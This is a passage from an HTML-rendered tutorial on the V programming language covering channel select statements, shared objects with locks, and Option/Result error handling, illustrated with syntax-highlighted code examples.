</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ch</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">chan</span> <span style="color:#a6e22e">f64</span>{}
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ch2</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">chan</span> <span style="color:#a6e22e">f64</span>{}
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ch3</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">chan</span> <span style="color:#a6e22e">f64</span>{}
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">b</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">0.0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">c</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">1.0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// ... setup spawn threads that will send on ch/ch2</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">spawn</span> <span style="color:#a6e22e">fn</span> (<span style="color:#a6e22e">the_channel</span> <span style="color:#66d9ef">chan</span> <span style="color:#a6e22e">f64</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">5</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">millisecond</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">the_channel</span> <span style="color:#f92672">&lt;-</span> <span style="color:#ae81ff">1.0</span>
</span></span><span style="display:flex;"><span>    }(<span style="color:#a6e22e">ch</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">spawn</span> <span style="color:#a6e22e">fn</span> (<span style="color:#a6e22e">the_channel</span> <span style="color:#66d9ef">chan</span> <span style="color:#a6e22e">f64</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">millisecond</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">the_channel</span> <span style="color:#f92672">&lt;-</span> <span style="color:#ae81ff">1.0</span>
</span></span><span style="display:flex;"><span>    }(<span style="color:#a6e22e">ch2</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">spawn</span> <span style="color:#a6e22e">fn</span> (<span style="color:#a6e22e">the_channel</span> <span style="color:#66d9ef">chan</span> <span style="color:#a6e22e">f64</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">the_channel</span>
</span></span><span style="display:flex;"><span>    }(<span style="color:#a6e22e">ch3</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">select</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">a</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">ch</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// do something with `a`</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">eprintln</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span>&gt; <span style="color:#a6e22e">a</span>: <span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">a</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">b</span> = <span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">ch2</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// do something with predeclared variable `b`</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">eprintln</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span>&gt; <span style="color:#a6e22e">b</span>: <span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">b</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ch3</span> <span style="color:#f92672">&lt;-</span> <span style="color:#a6e22e">c</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// do something if `c` was sent</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">5</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">millisecond</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">eprintln</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span>&gt; <span style="color:#a6e22e">c</span>: <span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">c</span>} <span style="color:#a6e22e">was</span> <span style="color:#a6e22e">send</span> <span style="color:#a6e22e">on</span> <span style="color:#a6e22e">channel</span> <span style="color:#a6e22e">ch3</span><span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">500</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">millisecond</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// do something if no channel has become ready within 0.5s</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">eprintln</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span>&gt; <span style="color:#a6e22e">more</span> <span style="color:#a6e22e">than</span> <span style="color:#ae81ff">0.5</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">passed</span> <span style="color:#a6e22e">without</span> <span style="color:#a6e22e">a</span> <span style="color:#a6e22e">channel</span> <span style="color:#a6e22e">being</span> <span style="color:#a6e22e">ready</span><span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">eprintln</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span>&gt; <span style="color:#a6e22e">done</span><span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The timeout branch is optional. If it is absent <code>select</code> waits for an unlimited amount of time. It is also possible to proceed immediately if no channel is ready in the moment <code>select</code> is called by adding an <code>else { ... }</code> branch. <code>else</code> and <code>&lt;timeout&gt;</code> are mutually exclusive.</p>
<p>The select command can be used as an expression of type bool that becomes false if all channels are closed:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#66d9ef">select</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ch</span> <span style="color:#f92672">&lt;-</span> <span style="color:#a6e22e">a</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// ...</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>} {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// channel was open</span>
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// channel is closed</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>For special purposes there are some builtin fields and methods:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">ch</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">int</span>{<span style="color:#a6e22e">cap</span>: <span style="color:#ae81ff">2</span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">// try to perfomr ch &lt;- 42</span>
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">ch</span>.<span style="color:#a6e22e">try_push</span>(<span style="color:#ae81ff">42</span>)) <span style="color:#75715e">// `success` if pushed, `not_ready` if full, `closed` if closed</span>
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">ch</span>.<span style="color:#a6e22e">len</span>) <span style="color:#75715e">// Number of items in the buffer</span>
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">ch</span>.<span style="color:#a6e22e">cap</span>) <span style="color:#75715e">// Buffer capacity</span>
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">ch</span>.<span style="color:#a6e22e">closed</span>) <span style="color:#75715e">// Whether the channel is closed</span>
</span></span></code></pre></div><blockquote>
<p>The <code>try_push/pop()</code> methods will return immediately with one of the results <code>success</code>, <code>not_ready</code> or <code>closed</code> - dependent on whether the object has been transferred or the reason why not. Usage of these methods and fields in production is not recommended - algorithms based on them are often subject to race conditions. Especially <code>.len</code> and <code>.closed</code> should not be used to make decisions. Use <code>or</code> branches, error propagation or <code>select</code> instead.</p>
</blockquote>
<h3 id="concurrency-shared-objects">Concurrency: Shared Objects</h3>
<p>Data can be exchanged between a thread and the calling thread via a shared variable. Such variables should be created as <code>shared</code> and passed to the thread as such, too. The underlying <code>struct</code> contains a hidden <em>mutex</em> that allows locking concurrent access using <code>rlock</code> for read-only and <code>lock</code> for read/write access.</p>
<blockquote>
<p>Note: Shared variables must be structs, arrays or maps.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Counter</span> {
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mut</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">value</span> <span style="color:#66d9ef">int</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> (<span style="color:#a6e22e">shared</span> <span style="color:#a6e22e">counter</span> <span style="color:#a6e22e">Counter</span>) <span style="color:#a6e22e">increment</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">lock</span> <span style="color:#a6e22e">counter</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">counter</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        println(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">Incremented</span> <span style="color:#a6e22e">to</span>: <span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">counter</span>.<span style="color:#a6e22e">value</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">shared</span> <span style="color:#a6e22e">counter</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">Counter</span>{}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">spawn</span> <span style="color:#a6e22e">counter</span>.<span style="color:#a6e22e">increment</span>()
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">spawn</span> <span style="color:#a6e22e">counter</span>.<span style="color:#a6e22e">increment</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">rlock</span> <span style="color:#a6e22e">counter</span> {
</span></span><span style="display:flex;"><span>        println(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">Final</span> <span style="color:#a6e22e">value</span>: <span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">counter</span>.<span style="color:#a6e22e">value</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="difference-between-channels-and-shared-objects">Difference Between Channels and Shared Objects</h3>
<p>Purpose:</p>
<ul>
<li>Channels: Used for message passing between threads, ensuring safe communication.</li>
<li>Shared objects: Used for direct data sharing and modification between threads.</li>
</ul>
<p>Synchronization:</p>
<ul>
<li>Channels: Implicit (via channel operations)</li>
<li>Shared objects: Explicit (via rlock/lock blocks)</li>
</ul>
<h3 id="optionresult-types-and-error-handling">Option/Result types and error handling</h3>
<p><strong>Option</strong> types can represent a value or <code>none</code>.
<strong>Result</strong> types may represent a value, or an <code>error</code> returned from a function.</p>
<p>Option types are declared by prepending <code>?</code> to the type name: <code>?Type</code>. Result types use <code>!</code>: <code>!Type</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">User</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">id</span>   <span style="color:#66d9ef">int</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">name</span> <span style="color:#66d9ef">string</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Repo</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">users</span> []<span style="color:#a6e22e">User</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> (<span style="color:#a6e22e">r</span> <span style="color:#a6e22e">Repo</span>) <span style="color:#a6e22e">find_user_by_id</span>(<span style="color:#a6e22e">id</span> <span style="color:#66d9ef">int</span>) !<span style="color:#a6e22e">User</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">user</span> <span style="color:#a6e22e">in</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">users</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">id</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">id</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// V automatically wraps this into a result or option type</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">user</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> error(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">User</span> <span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">id</span>} <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">found</span><span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// A version of the function using an option</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> (<span style="color:#a6e22e">r</span> <span style="color:#a6e22e">Repo</span>) <span style="color:#a6e22e">find_user_by_id2</span>(<span style="color:#a6e22e">id</span> <span style="color:#66d9ef">int</span>) <span style="color:#960050;background-color:#1e0010">?</span><span style="color:#a6e22e">User</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">user</span> <span style="color:#a6e22e">in</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">users</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">id</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">id</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">user</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">none</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">repo</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">Repo</span>{
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">users</span>: [<span style="color:#a6e22e">User</span>{<span style="color:#ae81ff">1</span>, <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">Andrew</span><span style="color:#960050;background-color:#1e0010">&#39;</span>}, <span style="color:#a6e22e">User</span>{<span style="color:#ae81ff">2</span>, <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">Bob</span><span style="color:#960050;background-color:#1e0010">&#39;</span>}, <span style="color:#a6e22e">User</span>{<span style="color:#ae81ff">10</span>, <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">Charles</span><span style="color:#960050;background-color:#1e0010">&#39;</span>}]
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">user</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">repo</span>.<span style="color:#a6e22e">find_user_by_id</span>(<span style="color:#ae81ff">10</span>) <span style="color:#a6e22e">or</span> { <span style="color:#75715e">// Option/Result types must be handled by `or` blocks</span>
</span></span><span style="display:flex;"><span>        println(<span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    println(<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">id</span>) <span style="color:#75715e">// &#34;10&#34;</span>
</span></span><span style="display:flex;"><span>    println(<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">name</span>) <span style="color:#75715e">// &#34;Charles&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">user2</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">repo</span>.<span style="color:#a6e22e">find_user_by_id2</span>(<span style="color:#ae81ff">10</span>) <span style="color:#a6e22e">or</span> { <span style="color:#66d9ef">return</span> }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// To create an Option var directly:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">my_optional_int</span> <span style="color:#f92672">:=</span> <span style="color:#960050;background-color:#1e0010">?</span>int(<span style="color:#a6e22e">none</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">my_optional_string</span> <span style="color:#f92672">:=</span> <span style="color:#960050;background-color:#1e0010">?</span>string(<span style="color:#a6e22e">none</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">my_optional_user</span> <span style="color:#f92672">:=</span> <span style="color:#960050;background-color:#1e0010">?</span><span style="color:#a6e22e">User</span>(<span style="color:#a6e22e">none</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The amount of work required to &ldquo;upgrade&rdquo; a function to an option/result function is minimal; you have to add a <code>?</code> or <code>!</code> to the return type and return <code>none</code> or an error (respectively) when something goes wrong.</p>
<p>This is the primary mechanism for error handling in V. They are still values, like in Go, but the advantage is that errors can&rsquo;t be unhandled, and handling them is a lot less verbose. Unlike other languages, V does not handle exceptions with <code>throw/try/catch</code> blocks.</p>
<p><code>err</code> is defined inside an <code>or</code> block and is set to the string message passed to the <code>error()</code> function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">user</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">repo</span>.<span style="color:#a6e22e">find_user_by_id</span>(<span style="color:#ae81ff">7</span>) <span style="color:#a6e22e">or</span> {
</span></span><span style="display:flex;"><span>    println(<span style="color:#a6e22e">err</span>) <span style="color:#75715e">// &#34;User 7 not found&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Use <code>err is ...</code> to compare errors:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">io</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">x</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">read</span>() <span style="color:#a6e22e">or</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">Eof</span> {
</span></span><span style="display:flex;"><span>        println(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">end</span> <span style="color:#a6e22e">of</span> <span style="color:#a6e22e">file</span><span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Only one <code>Option</code> or <code>Result</code> is allowed to be returned from a function. It is possible to return multiple values and still signal an error.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">multi_return</span>(<span style="color:#a6e22e">v</span> <span style="color:#66d9ef">int</span>) !(<span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">int</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">v</span> &lt; <span style="color:#ae81ff">0</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> error(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">must</span> <span style="color:#a6e22e">be</span> <span style="color:#a6e22e">positive</span><span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">v</span>, <span style="color:#a6e22e">v</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">v</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="handling-optionsresults">Handling options/results</h3>
<p>There are four ways of handling an option/result.</p>
<ol>
<li>The first method is to propagate the error:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">http</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">f</span>(<span style="color:#a6e22e">url</span> <span style="color:#66d9ef">string</span>) !<span style="color:#66d9ef">string</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">resp</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">url</span>)!
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">body</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The body of <code>f</code> is essentially a condensed version of:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">resp</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">url</span>) <span style="color:#a6e22e">or</span> { <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">err</span> }
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">body</span>
</span></span></code></pre></div><p><code>http.get</code> returns <code>!http.Response</code>. Because <code>!</code> follows the call, the error will be propagated to the caller of <code>f</code>. When using <code>?</code> after a function call producing an option, the enclosing function must return an option as well. If error propagation is used in the <code>main()</code> function it will panic instead, since the error cannot be propagated any further.</p>
<ol start="2">
<li>The second method is to break from execution early:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">user</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">repo</span>.<span style="color:#a6e22e">find_user_by_id</span>(<span style="color:#ae81ff">7</span>) <span style="color:#a6e22e">or</span> { <span style="color:#66d9ef">return</span> }
</span></span></code></pre></div><p>Here, you can either call <code>panic()</code> or <code>exit(</code>), which will stop the execution of the entire program, or use a control flow statement (<code>return</code>, <code>break</code>, <code>continue</code>, etc) to break from the current block.</p>
<blockquote>
<p><code>break</code> and <code>continue</code> can only be used inside a <code>for</code> loop.</p>
</blockquote>
<ol start="3">
<li>The third method is to provide a default value at the end of the <code>or</code> block. In case of an error, that value would be assigned instead, so it must have the same type as the content of the Option being handled.</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">do_something</span>(<span style="color:#a6e22e">s</span> <span style="color:#66d9ef">string</span>) !<span style="color:#66d9ef">string</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">s</span> <span style="color:#f92672">==</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">foo</span><span style="color:#960050;background-color:#1e0010">&#39;</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">foo</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> error(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">invalid</span> <span style="color:#66d9ef">string</span><span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">a</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">do_something</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">foo</span><span style="color:#960050;background-color:#1e0010">&#39;</span>) <span style="color:#a6e22e">or</span> { <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#66d9ef">default</span><span style="color:#960050;background-color:#1e0010">&#39;</span> } <span style="color:#75715e">// a will be &#39;foo&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">b</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">do_something</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">bar</span><span style="color:#960050;background-color:#1e0010">&#39;</span>) <span style="color:#a6e22e">or</span> { <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#66d9ef">default</span><span style="color:#960050;background-color:#1e0010">&#39;</span> } <span style="color:#75715e">// b will be &#39;default&#39;</span>
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">a</span>)
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">b</span>)
</span></span></code></pre></div><ol start="4">
<li>The fourth method is to use <code>if</code> unwrapping:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">http</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#a6e22e">resp</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">get</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">https</span>:<span style="color:#75715e">//google.com&#39;) {</span>
</span></span><span style="display:flex;"><span>    println(<span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">body</span>) <span style="color:#75715e">// resp is a http.Response, not an option</span>
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    println(<span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>}
